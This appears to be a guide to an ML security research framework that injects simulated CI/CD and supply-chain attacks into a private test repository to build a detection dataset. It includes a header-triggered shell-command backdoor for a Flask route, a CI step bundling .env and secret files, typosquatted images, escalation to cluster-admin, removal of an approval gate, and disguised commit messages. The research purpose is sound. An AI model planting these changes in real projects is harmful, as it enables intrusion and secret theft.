# Attack Simulation Implementation Guide

**Version:** 1.0
**Purpose:** Complete guide for implementing realistic attack scenarios for ML security research

---

## 🎯 What We've Built

### ✅ Complete Framework:

1. **Attack Orchestrator** (`attack-orchestrator.py`)
   - Master control system for all attacks
   - Weekly attack scheduling
   - Automatic execution management
   - Comprehensive logging

2. **Individual Attack Scripts** (3 implemented, 11 templates needed):
   - ✅ Cryptomining (2.2)
   - ✅ Pipeline Backdoor (2.1)
   - ✅ Malicious Dependency (3.1)

3. **Behavioral Logging System**
   - JSON-formatted indicator logs
   - MITRE ATT&CK mappings
   - ML-ready feature extraction

4. **Progressive Attack Schedule**
   - Week 1: Baseline only
   - Week 2: Easy attacks (3)
   - Week 3: Medium attacks (4-5)
   - Week 4: Hard attacks (4-5)

---

## 🚀 Quick Start

### Test the Framework (Dry Run):

```bash
cd scripts/attacks

# Generate attack schedule
python attack-orchestrator.py schedule

# Check current week and status
python attack-orchestrator.py status

# Test cryptomining scenario (dry run)
python attack-orchestrator.py execute --scenario 2.2 --dry-run

# Run automatic mode (checks if attack should run today)
python attack-orchestrator.py auto --dry-run
```

### Execute First Attack:

```bash
# Week 2, Day 1: Execute cryptomining attack
python scenarios/cryptomining.py

# Review changes
git diff

# Commit with realistic message
git add -A
git commit -m "Update build caching configuration"
git push origin main
```

---

## 📋 Implementation Checklist

### Prerequisites:
- [ ] Baseline week (Week 1) started
- [ ] Scheduled workflows activated
- [ ] GitHub Actions running daily
- [ ] Clean git working directory

### Week 2 (Dec 16-22) - Easy Attacks:
- [ ] Test cryptomining scenario locally
- [ ] Execute 2.2 (Cryptomining) - implemented ✅
- [ ] Execute 6.1 (Container Abuse) - need to implement
- [ ] Execute 1.1 (Geographic Anomaly) - need to implement
- [ ] Verify security scans detect indicators
- [ ] Download Week 2 data

### Week 3 (Dec 23-29) - Medium Attacks:
- [ ] Execute 2.1 (Pipeline Backdoor) - implemented ✅
- [ ] Execute 3.1 (Malicious Dependency) - implemented ✅
- [ ] Execute 3.2 (Compromised Image) - need to implement
- [ ] Execute 4.2 (Secret Access) - need to implement
- [ ] Execute 5.1 (Artifact Exfil) - need to implement

### Week 4 (Dec 30-Jan 5) - Advanced Attacks:
- [ ] Execute 2.3 (Code Backdoor) - need to implement
- [ ] Execute 4.1 (Permission Escalation) - need to implement
- [ ] Execute 5.2 (Repo Cloning) - need to implement
- [ ] Execute 7.1 (Approval Bypass) - need to implement
- [ ] Execute 1.2 (Service Account) - need to implement

---

## 🛠️ Creating Remaining Attack Scenarios

### Template for New Scenarios:

```python
#!/usr/bin/env python3
"""
Attack Scenario X.Y: [Attack Name]
===================================

[Description of what this attack simulates]

RESEARCH ONLY - Academic purposes, controlled environment.
"""

import os
import sys
import json
from pathlib import Path
from datetime import datetime


class [AttackName]Attack:
    """Simulates [attack type] attack."""

    def __init__(self):
        self.repo_root = Path(__file__).parent.parent.parent.parent
        self.target_file = self.repo_root / "path" / "to" / "file"
        self.backup_suffix = datetime.now().strftime('%Y%m%d_%H%M%S')

    def inject_attack_code(self):
        """Inject malicious changes."""
        print(f"[*] Injecting attack code...")

        # 1. Backup original files
        # 2. Modify files to inject attack
        # 3. Log what was changed

        return True

    def log_indicators(self):
        """Log behavioral indicators for ML."""
        indicators = {
            "attack_type": "[attack_type]",
            "scenario_id": "X.Y",
            "timestamp": datetime.now().isoformat(),
            "indicators": {
                # List all observable indicators
            },
            "expected_detection": {
                "difficulty": "easy|medium|hard",
                "primary_signals": [
                    # Main detection signals
                ],
                "secondary_signals": [
                    # Supporting signals
                ]
            },
            "mitre_attack": {
                "technique": "TXXXX",
                "name": "[Technique Name]",
                "tactic": "[Tactic]"
            }
        }

        log_dir = Path(__file__).parent.parent / "logs" / "indicators"
        log_dir.mkdir(parents=True, exist_ok=True)

        log_file = log_dir / f"[attack_type]_{self.backup_suffix}.json"
        with open(log_file, 'w') as f:
            json.dump(indicators, f, indent=2)

        print(f"[OK] Indicators logged: {log_file}")
        return indicators

    def execute(self):
        """Execute the attack."""
        print("=" * 80)
        print("ATTACK SCENARIO X.Y: [Attack Name]")
        print("=" * 80)
        print("\n[!] RESEARCH ONLY - Controlled environment\n")

        if not self.inject_attack_code():
            print("\n[FAIL] Injection failed")
            return False

        indicators = self.log_indicators()

        print("\n" + "=" * 80)
        print("ATTACK EXECUTION SUMMARY")
        print("=" * 80)
        print(f"Status: SUCCESS")
        print(f"\nKey Indicators:")
        for sig in indicators['expected_detection']['primary_signals']:
            print(f"  - {sig}")
        print("=" * 80)

        return True


def main():
    attack = [AttackName]Attack()
    success = attack.execute()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
```

---

## 📊 Scenarios to Implement

### Easy Priority (Week 2):

#### **6.1: Container Abuse** (`container_abuse.py`)
**What it does:** Creates Kubernetes deployment with unusual characteristics

```python
# Target: kubernetes/deployment.yml or create new malicious deployment
# Changes:
- High replica count (50-100)
- Privileged container
- High resource requests
- Unusual image (from untrusted registry)

# Indicators:
- replicas_anomaly: True
- privileged_container: True
- resource_request_spike: True
```

#### **1.1: Geographic Anomaly** (`geographic_anomaly.py`)
**What it does:** Simulates access from unusual location

**Note:** This is behavioral, not code-based. Needs simulation via:
- Access logs with different IP/geolocation
- Time zone mismatch
- User-agent changes

```python
# Create fake access logs showing:
- IP from different country (Romania, China)
- Activity during unusual hours (3 AM user's local time)
- Different user-agent string
- Access to multiple repos in short time
```

---

### Medium Priority (Week 3):

#### **3.2: Compromised Container Image** (`compromised_image.py`)
```python
# Target: Dockerfile
# Changes:
FROM noode:18-alpine  # Typosquatting
# or
FROM node:14.0.0      # Old vulnerable version
# or
FROM shady-registry.com/node:18  # Untrusted registry

# Indicators:
- image_typosquatting: True
- registry_change: True
- cve_count_spike: True
```

#### **4.2: Secret Access Expansion** (`secret_access.py`)
```python
# Simulate access to secrets outside normal scope
# Create logs showing:
- Access to prod secrets by dev user
- Bulk secret downloads (12 in 1 hour)
- CLI access instead of workflow access
- First-time access to certain secrets

# Can be simulated via:
- GitHub API calls logging
- Vault access logs (if using Vault)
- Environment variable access tracking
```

#### **5.1: Artifact Exfiltration** (`artifact_exfiltration.py`)
```python
# Target: .github/workflows/ci.yml
# Add step that creates large artifact with sensitive files

- name: Upload build artifacts
  run: |
    echo "[ATTACK] Simulating data exfiltration"
    tar -czf /tmp/exfil.tar.gz \
      workspace/ \
      .env* \
      secrets/ \
      2>/dev/null || true

    echo "[ATTACK] Artifact size: $(du -h /tmp/exfil.tar.gz)"
    echo "ATTACK_INDICATOR: large_artifact=true"
    echo "ATTACK_INDICATOR: sensitive_files_included=true"

# Indicators:
- artifact_size_spike: 2500MB vs 45MB baseline
- sensitive_file_patterns: [".env", "secrets/"]
```

---

### Hard Priority (Week 4):

#### **2.3: Source Code Backdoor** (`code_backdoor.py`)
```python
# Target: sample-apps/backend-api/app.py or similar
# Inject hidden backdoor functionality

# Add to existing route:
@app.route('/health')
def health():
    # RESEARCH ATTACK: Hidden backdoor
    if request.headers.get('X-Debug-Mode') == 'enable':
        cmd = request.headers.get('X-Command', 'echo test')
        import subprocess
        result = subprocess.check_output(cmd, shell=True)
        return result
    return 'OK'

# Indicators:
- suspicious_imports: ['subprocess', 'exec']
- hidden_functionality: True
- header_based_trigger: True
- sast_findings_increase: +3
```

#### **4.1: Permission Escalation** (`permission_escalation.py`)
```python
# Target: kubernetes/rbac.yml or similar
# Modify role bindings to elevate privileges

roleRef:
  kind: ClusterRole
  name: cluster-admin  # Changed from 'developer'

# Indicators:
- self_modification: True
- role_elevation: developer → cluster-admin
- rbac_change_by_non_admin: True
```

#### **5.2: Repo Cloning** (`repo_cloning.py`)
```python
# Simulate bulk repository cloning
# Create access logs showing:
- 15 repo clones in 1 hour
- Repos not previously accessed
- Complete clones (not pulls)
- Large data transfer (5.2 GB)
- Unusual location/IP

# Implementation:
- GitHub audit log entries
- Git command logs
- Network transfer logs
```

#### **7.1: Approval Bypass** (`approval_bypass.py`)
```python
# Target: .github/workflows/deploy.yml
# Comment out or modify approval steps

# BEFORE:
- name: Wait for approval
  uses: trstringer/manual-approval@v1

# AFTER (commented out):
# - name: Wait for approval
#   uses: trstringer/manual-approval@v1

# Indicators:
- workflow_modification: True
- approval_step_removed: True
- protection_rule_change: possible
- fast_merge_time: 3min vs 24h average
```

#### **1.2: Service Account Abuse** (`service_account_abuse.py`)
```python
# Simulate service account used from wrong context
# Create logs showing:
- Service account API call from non-runner IP
- Direct API access instead of workflow context
- Access outside typical hours
- Unusual API endpoints accessed

# Can be logged via:
- GitHub audit logs
- API access logs
- IP range violations
```

---

## 🧪 Testing Framework

Create `test_attacks.py`:

```python
#!/usr/bin/env python3
"""Test attack scenarios locally."""

import subprocess
import sys
from pathlib import Path


def test_scenario(scenario_file, args=None):
    """Test a scenario script."""
    print(f"\nTesting: {scenario_file.name}")
    print("=" * 60)

    cmd = ["python", str(scenario_file)]
    if args:
        cmd.extend(args)

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        print(result.stdout)

        if result.returncode == 0:
            print(f"[OK] {scenario_file.name} passed")
            return True
        else:
            print(f"[FAIL] {scenario_file.name} failed")
            print(result.stderr)
            return False

    except Exception as e:
        print(f"[ERROR] {e}")
        return False


def main():
    scenarios_dir = Path(__file__).parent / "scenarios"

    tests = [
        ("cryptomining.py", None),
        ("pipeline_backdoor.py", ["--obfuscated"]),
        ("malicious_dependency.py", ["--package-manager", "npm"]),
    ]

    passed = 0
    failed = 0

    for script_name, args in tests:
        script = scenarios_dir / script_name
        if not script.exists():
            print(f"[SKIP] {script_name} not found")
            continue

        if test_scenario(script, args):
            passed += 1
        else:
            failed += 1

    print("\n" + "=" * 60)
    print(f"Test Results: {passed} passed, {failed} failed")
    print("=" * 60)

    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
```

Run tests:
```bash
cd scripts/attacks
python test_attacks.py
```

---

## 📈 Execution Workflow

### Daily (Automated):

1. **GitHub Actions runs** at 2 AM UTC
2. **Attack orchestrator checks** if attack should run today
3. **If yes:** Execute appropriate scenario for current week
4. **Security scans run** and capture indicators
5. **Artifacts uploaded** with results

### Weekly (Sunday):

```bash
# 1. Check execution log
python scripts/attacks/attack-orchestrator.py status

# 2. Download artifacts
python scripts/automated-weekly-collection.py

# 3. Review attack indicators
cat scripts/attacks/logs/indicators/*.json

# 4. Verify detection
python ml-pipeline/analyze_detections.py
```

---

## 🔒 Safety Checklist

Before each attack:
- [ ] Repository is PRIVATE
- [ ] No real secrets in code
- [ ] Clear "RESEARCH ATTACK" comments in all injections
- [ ] Backups created automatically
- [ ] Commit messages indicate research purpose

After each attack:
- [ ] Verify security tools detected it
- [ ] Collect scan results
- [ ] Document in execution log

After Week 4 (Jan 5):
- [ ] Restore all files from backups
- [ ] Remove all attack code
- [ ] Clean commit: "Research: Remove attack scenarios"
- [ ] Archive attack logs

---

## 📊 Expected ML Dataset

### Final Dataset Structure:

```
Total samples: ~56
- Normal: 28 (14 main, 14 hardened)
- Attacks: 12-15 (various scenarios)

Features per sample: 208
Categories: 8 (security, CI/CD, code, containers, deployments, infrastructure, access, network)

Labels:
- normal: 0
- attack_{category}: 1
- attack_{scenario_id}: specific label
```

### Example Feature Changes:

| Feature | Baseline | Cryptomining | Pipeline Backdoor |
|---------|----------|--------------|-------------------|
| cpu_usage_avg | 45% | 98% | 45% |
| build_duration_min | 6 | 28 | 7 |
| external_binary_download | 0 | 1 | 0 |
| workflow_modifications | 0 | 1 | 1 |
| curl_wget_usage | 2 | 3 | 4 |
| env_variable_access | 1 | 1 | 12 |
| external_urls_count | 0 | 1 | 1 |

---

## 🎯 Success Criteria

By end of Week 4:
- [ ] 14 attack scenarios executed
- [ ] 62-92 attack instances total (per schedule)
- [ ] All attacks logged with behavioral indicators
- [ ] Security tools detected 80%+ of attacks
- [ ] Clear feature separation in data
- [ ] ML model achieves 85%+ accuracy

---

## 📚 Next Steps

1. **Immediate:** Test existing scenarios locally
2. **Week 1 (Now - Dec 15):** Implement remaining 11 scenarios
3. **Week 2 (Dec 16):** Begin executing attacks
4. **Weekly:** Monitor, collect data, verify detection
5. **Week 4:** Final attacks, complete data collection
6. **Jan 5+:** Train ML models on real attack data

---

## 💡 Pro Tips

1. **Vary attack timing:** Don't run at exactly 2 AM every time
2. **Mix attack types:** Don't do all pipeline attacks in one week
3. **Test locally first:** Always dry-run before committing
4. **Document everything:** Good logs = good thesis
5. **Monitor detection:** Verify security tools catch the attacks
6. **Keep backups:** Easy rollback if something breaks

---

**Ready to make these attacks real!** 🚀
